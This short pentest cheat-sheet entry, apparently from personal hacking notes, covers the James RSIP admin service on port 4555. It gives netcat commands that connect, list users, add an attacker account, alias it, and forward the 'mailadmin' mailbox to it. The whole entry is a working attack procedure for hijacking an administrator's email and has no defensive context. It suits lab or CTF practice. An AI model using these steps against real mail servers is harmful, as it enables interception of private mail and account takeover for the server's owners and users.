# 🟡 RSIP

### <mark style="color:orange;">Forwarding admin’s mails</mark> <a href="#forwarding-admin-s-mails" id="forwarding-admin-s-mails"></a>

```bash
# Connection through netcat (can test for creds)
nc -nv <IP> 4555

# Get commands
HELP

# Get users (hopefully an admin?)
listusers

# Add user
adduser haax haaxpass

# Set an alias for our user
setalias mailadmin haax

# Set mail forwarding
setforwarding mailadmin haax@lab.local
```
